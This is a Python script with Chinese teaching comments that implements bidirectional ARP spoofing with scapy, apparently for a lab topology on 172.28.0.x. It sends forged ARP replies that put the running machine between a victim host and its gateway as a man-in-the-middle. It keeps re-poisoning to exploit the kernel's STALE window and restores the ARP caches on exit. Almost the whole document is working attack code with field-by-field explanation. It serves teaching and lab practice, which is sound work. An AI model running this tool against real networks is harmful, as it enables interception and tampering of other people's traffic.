#!/usr/bin/env python3
"""
ARP 双向欺骗 —— 手工实现版（scapy）

为什么不用现成的 arpspoof 命令？
  现成工具一条命令就完事，但你不知道它发了什么。
  这个脚本把「一个 ARP 应答包到底长什么样」摊开给你看，
  再加两个细节：单播而不是广播、退出时自动恢复。

原理一句话：
  ARP 协议本身没有认证。任何机器说「我是 172.28.0.2，我的 MAC 是 aa:bb:cc:dd:ee:ff」，
  收到的主机就可能据此更新自己的 ARP 缓存 —— 哪怕它从没发过这个询问。

  注意「可能」：现代 Linux 内核会拒收「非请求」的 ARP 应答去改写处于 REACHABLE
  状态的邻居条目，要等条目老化成 STALE 才接受。所以脚本必须持续发，等的就是
  那个窗口。细节见 README 实验 2 和 PRINCIPLE.md 第五节。

双向欺骗（关键）：
  只骗受害者的上行流量只能算「偷听」，受害者回包还是会直接走真网关，
  很多场景（比如 TCP 三次握手）会直接断。所以要两个方向都骗：

    对 victim 说：网关 IP(172.28.0.2) 的 MAC 是我
    对 gateway 说：受害者 IP(172.28.0.3) 的 MAC 是我

  这样 victim <-> gateway 的每一个包都先经过攻击机，
  攻击机再开 IP 转发把它真的转出去，就是完整的中间人（MITM）。

用法：
  python3 arpspoof.py                       # 用脚本里的默认拓扑
  python3 arpspoof.py -i eth0 --gateway 172.28.0.2 --victim 172.28.0.3
  python3 arpspoof.py --interval 1          # 每秒毒化一次（默认 2 秒）
  Ctrl-C 退出会自动发正确的 ARP 修复缓存
"""

import argparse
import sys
import time

from scapy.all import ARP, Ether, get_if_hwaddr, sendp, srp


def arp_resolve(ip, iface, timeout=2):
    """
    老老实实问一次「这个 IP 的 MAC 是多少」，也就是发一个 ARP 请求：

        Ether dst = ff:ff:ff:ff:ff:ff   ← 广播，全网段都能收到
        ARP op=1 (who-has), pdst=目标 IP

    目标主机收到后会回一个 op=2 的 is-at 应答，我们从应答里取 hwsrc。
    这里没有用 scapy 的 getmacbyip()，因为那个函数在不同版本里参数名变过，
    自己写一遍反而更稳，也顺便把 ARP 请求长什么样讲清楚。
    """
    ans, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
        iface=iface,
        timeout=timeout,
        verbose=False,
    )
    for _, rcv in ans:
        return rcv[ARP].hwsrc
    return None


def make_reply(eth_dst, eth_src, claimed_ip, target_ip, target_mac):
    """
    造一个「ARP 应答」帧。逐字段拆开看：

    ┌─ Ether 头（二层，决定这张帧被谁收下）
    │  dst = 收件人 MAC —— 写具体 MAC 就是单播，只送到这一台
    │  src = 发件人 MAC —— 稍后 ARP 里的 hwsrc 必须和它一致，否则容易被识破
    │
    └─ ARP 包（真正的谎言在这里）
       op     = 2        表示 is-at（应答）；请求是 1 (who-has)
       hwsrc  = 我声称的 MAC
       psrc   = 我声称的 IP          ← 骗局核心：这两个字段本不该属于我
       hwdst  = 收件人的 MAC
       pdst   = 收件人的 IP
    """
    return Ether(dst=eth_dst, src=eth_src) / ARP(
        op=2,
        hwsrc=eth_src,
        psrc=claimed_ip,
        hwdst=target_mac,
        pdst=target_ip,
    )


class ArpSpoofer:
    def __init__(self, iface, gateway_ip, victim_ip, interval=2.0):
        self.iface = iface
        self.gateway_ip = gateway_ip
        self.victim_ip = victim_ip
        self.interval = interval

        # 我自己的 MAC：所有伪造应答里都说「那个 IP 的 MAC 是我」
        self.my_mac = get_if_hwaddr(iface)

    def resolve(self):
        """
        开局先老老实实问一次真实 MAC，原因有两个：
          1. 伪造时 Ether.dst 要填收件人的真实 MAC
          2. 退出时要靠真实 MAC 把 ARP 缓存改回去，否则受害者断网
        """
        print(f"[*] 接口 {self.iface}，本机 MAC {self.my_mac}")
        self.gateway_mac = arp_resolve(self.gateway_ip, self.iface)
        self.victim_mac = arp_resolve(self.victim_ip, self.iface)

        if not self.gateway_mac:
            sys.exit(f"[!] 解析不到 {self.gateway_ip} 的 MAC，网关没起来或者网段不对")
        if not self.victim_mac:
            sys.exit(f"[!] 解析不到 {self.victim_ip} 的 MAC")

        print(f"[*] 真实 gateway {self.gateway_ip} -> {self.gateway_mac}")
        print(f"[*] 真实 victim  {self.victim_ip} -> {self.victim_mac}")

    def poison_once(self):
        # 方向一：骗受害者，让它以为「网关的 MAC 是攻击机」
        sendp(
            make_reply(
                eth_dst=self.victim_mac,
                eth_src=self.my_mac,
                claimed_ip=self.gateway_ip,
                target_ip=self.victim_ip,
                target_mac=self.victim_mac,
            ),
            iface=self.iface,
            verbose=False,
        )
        # 方向二：骗网关，让它以为「受害者的 MAC 是攻击机」
        sendp(
            make_reply(
                eth_dst=self.gateway_mac,
                eth_src=self.my_mac,
                claimed_ip=self.victim_ip,
                target_ip=self.gateway_ip,
                target_mac=self.gateway_mac,
            ),
            iface=self.iface,
            verbose=False,
        )

    def run(self):
        self.resolve()
        print("[*] 开始毒化，Ctrl-C 停止；另开终端在 attacker 上 tcpdump 观察")
        round_no = 0
        try:
            while True:
                self.poison_once()
                round_no += 1
                # 每 2 秒刷一次，有两个原因：
                # 1. 条目会老化，受害者可能重新问到正确 MAC，欺骗失效
                # 2. 更关键：REACHABLE 状态下内核拒收伪造应答，只有条目变成
                #    STALE 的那几秒窗口才能改写。持续发 = 一直蹲这个窗口
                if round_no % 5 == 1:
                    print(f"[*] 第 {round_no} 轮毒化已发送")
                time.sleep(self.interval)
        except KeyboardInterrupt:
            print("\n[*] 收到 Ctrl-C，开始恢复 ARP 缓存……")
            self.restore()

    def restore(self):
        """
        退出时必须把「正确的映射」再发回去，连发 5 次提高成功率。
        不做这一步的后果：受害者缓存里网关 MAC 还是攻击机的，
        攻击机一关，受害者就彻底断网，直到缓存老化（最长几分钟）。
        这也是很多人「打完靶场宿主机上不了网」的原因。
        """
        for _ in range(5):
            sendp(
                make_reply(
                    eth_dst=self.victim_mac,
                    eth_src=self.gateway_mac,
                    claimed_ip=self.gateway_ip,
                    target_ip=self.victim_ip,
                    target_mac=self.victim_mac,
                ),
                iface=self.iface,
                verbose=False,
            )
            sendp(
                make_reply(
                    eth_dst=self.gateway_mac,
                    eth_src=self.victim_mac,
                    claimed_ip=self.victim_ip,
                    target_ip=self.gateway_ip,
                    target_mac=self.gateway_mac,
                ),
                iface=self.iface,
                verbose=False,
            )
            time.sleep(0.3)
        print("[*] 已恢复")


def main():
    p = argparse.ArgumentParser(description="ARP 双向欺骗（教学版）")
    p.add_argument("-i", "--iface", default="eth0")
    p.add_argument("--gateway", default="172.28.0.2", help="被冒充的 IP（通常是网关）")
    p.add_argument("--victim", default="172.28.0.3", help="被欺骗的主机 IP")
    p.add_argument("--interval", type=float, default=2.0, help="毒化间隔秒数")
    args = p.parse_args()

    ArpSpoofer(args.iface, args.gateway, args.victim, args.interval).run()


if __name__ == "__main__":
    main()
